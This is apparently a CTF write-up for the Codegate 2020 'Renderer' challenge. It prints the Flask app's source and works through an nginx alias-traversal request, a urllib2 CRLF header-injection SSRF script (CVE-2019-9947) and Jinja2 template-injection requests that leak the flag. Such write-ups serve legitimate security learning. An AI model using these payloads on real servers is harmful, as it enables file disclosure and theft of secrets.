Renderer
------------

## Intro

**Description:**

It is my first flask project with nginx. Write your own message, and get flag!

http://110.10.147.169/renderer/
http://58.229.253.144/renderer/

DOWNLOAD :
http://ctf.codegate.org/099ef54feeff0c4e7c2e4c7dfd7deb6e/022fd23aa5d26fbeea4ea890710178e9

point : 750

## Sources from the link in description:

settings/run.sh
```bash
#!/bin/bash

service nginx stop
mv /etc/nginx/sites-enabled/default /tmp/
mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask

service nginx restart

uwsgi /home/src/uwsgi.ini &
/bin/bash /home/cleaner.sh &

/bin/bash
```

Dockerfile
```
FROM python:2.7.16

ENV FLAG CODEGATE2020{**DELETED**}

RUN apt-get update
RUN apt-get install -y nginx
RUN pip install flask uwsgi

ADD prob_src/src /home/src
ADD settings/nginx-flask.conf /tmp/nginx-flask.conf

ADD prob_src/static /home/static
RUN chmod 777 /home/static

RUN mkdir /home/tickets
RUN chmod 777 /home/tickets

ADD settings/run.sh /home/run.sh
RUN chmod +x /home/run.sh

ADD settings/cleaner.sh /home/cleaner.sh
RUN chmod +x /home/cleaner.sh

CMD ["/bin/bash", "/home/run.sh"]
```

## Solution:

### Alias Traversal

As soon as I saw the description and the words like: "It is my first flask project with nginx" I understand than it's about nginx alias traversal.

So Nginx alias traversal is here (We already knew the path to the `uwsgi.ini` file and position of the `static` folder in file system):
```
GET /static../src/uwsgi.ini HTTP/1.1
Host: 110.10.147.169
```

After I had found alias traversal vulnerability I could read an arbitrary files in `home` folder.

Retrived files:

/home/src/uwsgi.ini
```ini
[uwsgi]
chdir = /home/src
module = run
callable = app
processes = 4
uid = www-data
gid = www-data
socket = /tmp/renderer.sock
chmod-socket = 666
vacuum = true
daemonize = /tmp/uwsgi.log
die-on-term = true
pidfile = /tmp/renderer.pid
```

/home/src/run.py
```python
from app import *
import sys

def main():
    #TODO : disable debug
    app.run(debug=False, host="0.0.0.0", port=80)

if __name__ == '__main__':
    main()
```

/home/src/app/__init__.py
```python
from flask import Flask
from app import routes
import os

app = Flask(__name__)
app.url_map.strict_slashes = False
app.register_blueprint(routes.front, url_prefix="/renderer")
app.config["FLAG"] = os.getenv("FLAG", "CODEGATE2020{}")
```

/home/src/app/routes.py
```python

from flask import Flask, render_template, render_template_string, request, redirect, abort, Blueprint
import urllib2
import time
import hashlib

from os import path
from urlparse import urlparse

front = Blueprint("renderer", __name__)

@front.before_request
def test():
    print(request.url)

@front.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")
    
    url = request.form.get("url")
    res = proxy_read(url) if url else False
    if not res:
        abort(400)

    return render_template("index.html", data = res)

@front.route("/whatismyip", methods=["GET"])
def ipcheck():
    return render_template("ip.html", ip = get_ip(), real_ip = get_real_ip())

@front.route("/admin", methods=["GET"])
def admin_access():
    ip = get_ip()
    rip = get_real_ip()

    if ip not in ["127.0.0.1", "127.0.0.2"]: #super private ip :)
        abort(403)

    if ip != rip: #if use proxy
        ticket = write_log(rip)
        return render_template("admin_remote.html", ticket = ticket)

    else:
        if ip == "127.0.0.2" and request.args.get("body"):
            ticket = write_extend_log(rip, request.args.get("body"))
            return render_template("admin_local.html", ticket = ticket)
        else:
            return render_template("admin_local.html", ticket = None)

@front.route("/admin/ticket", methods=["GET"])
def admin_ticket():
    ip = get_ip()
    rip = get_real_ip()

    if ip != rip: #proxy doesn't allow to show ticket
        print 1
        abort(403)
    if ip not in ["127.0.0.1", "127.0.0.2"]: #only local
        print 2
        abort(403)
    if request.headers.get("User-Agent") != "AdminBrowser/1.337":
        print request.headers.get("User-Agent")
        abort(403)
    
    if request.args.get("ticket"):
        log = read_log(request.args.get("ticket"))
        if not log:
            print 4
            abort(403)
        return render_template_string(log)

def get_ip():
    return request.remote_addr

def get_real_ip():
    return request.headers.get("X-Forwarded-For") or get_ip()

def proxy_read(url):
    #TODO : implement logging
    
    s = urlparse(url).scheme
    if s not in ["http", "https"]: #sjgdmfRk akfRk
        return ""

    return urllib2.urlopen(url).read()

def write_log(rip):
    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
    with open("/home/tickets/%s" % tid, "w") as f:
        log_str = "Admin page accessed from %s" % rip
        f.write(log_str)
    
    return tid

def write_extend_log(rip, body):
    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()
    with open("/home/tickets/%s" % tid, "w") as f:
        f.write(body)

    return tid

def read_log(ticket):
    if not (ticket and ticket.isalnum()):
        return False
    
    if path.exists("/home/tickets/%s" % ticket):
        with open("/home/tickets/%s" % ticket, "r") as f:
            return f.read()
    else:
        return False
```

And sure, we know that tickets with logs storing in the `/home/tickets` folder that we could to read with know vulnerability.



## urllib2 HTTP Header Injection

The web service allows us to make HTTP requests like in situation with SSRF attack. We could see it in the following lines:

```python
res = proxy_read(url) if url else False

...

def proxy_read(url):
    #TODO : implement logging
    
    s = urlparse(url).scheme
    if s not in ["http", "https"]: #sjgdmfRk akfRk
        return ""
    return urllib2.urlopen(url).read()

```

As we can see in source code, the FLAG was kept in the flask's `config` variable. It says us that we can retrieve it with python command. Also we saw that the web service using `render_template` and `render_template_string` functions that work with Jinja2 template engine. So, we can predict that we will retrive the flag with string like `{{config.items()}}` in the template file.

But to send and read something from `/admin` we must learn to send requests with `X-Forwarded-For` header.

We knew that urllib2.urlopen() have vulnerability that could help us. (CVE-2019-9947)

To test it we have created host with similar conditions:

Dockerfile
```
FROM python:2.7.16

RUN apt-get update

CMD ["/bin/bash"]
```

exploit.py
```
import urllib2

url = "http://empty.jack.su/renderer/admin/ticket?ticket=6edaec793cac4db942472712a57d656b06d4cd0c HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\nUser-Agent: AdminBrowser/1.337\r\nHost: 127.0.0.1\r\n\r\nLol"

info = urllib2.urlopen(url).read()
print(info)
```

It works!

### Template injection

After we learned to send request with arbitrary headers, we can retrive the flag.

With function `write_log(rip)` we could write arbitrary string from `X-Forwarded-For` to the ticket file.

#### Send

With the next request we wrote string `{{config.items()}}` to file:
```
POST /renderer/ HTTP/1.1
Host: 110.10.147.169
Content-Type: application/x-www-form-urlencoded
Content-Length: 97

url=http://127.0.0.1/renderer/admin HTTP/1.1%0d%0aX-Forwarded-For: {{config.items()}}%0d%0aTEST: 
```

#### Check

With the following request we check that injection on the it's place:
```
GET /static../tickets/74269dcedd704384f5eec8738f938ce9f6ca4640 HTTP/1.1
Host: 110.10.147.169

```

Result:
```
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sun, 09 Feb 2020 13:43:08 GMT
Content-Type: application/octet-stream
Content-Length: 43
X-From: nginx
Accept-Ranges: bytes

Admin page accessed from {{config.items()}}
```

#### Read the FLAG

```
POST /renderer/ HTTP/1.1
Host: 110.10.147.169
Content-Type: application/x-www-form-urlencoded
Content-Length: 212

url=http://127.0.0.1/renderer/admin/ticket?ticket=74269dcedd704384f5eec8738f938ce9f6ca4640%20HTTP/1.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aUser-Agent:%20AdminBrowser/1.337%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aLol:
```

Result:
```
...
FLAG&amp;#39;, &amp;#39;CODEGATE2020{CrLfMakesLocalGreatAgain}&amp;#39;
...
```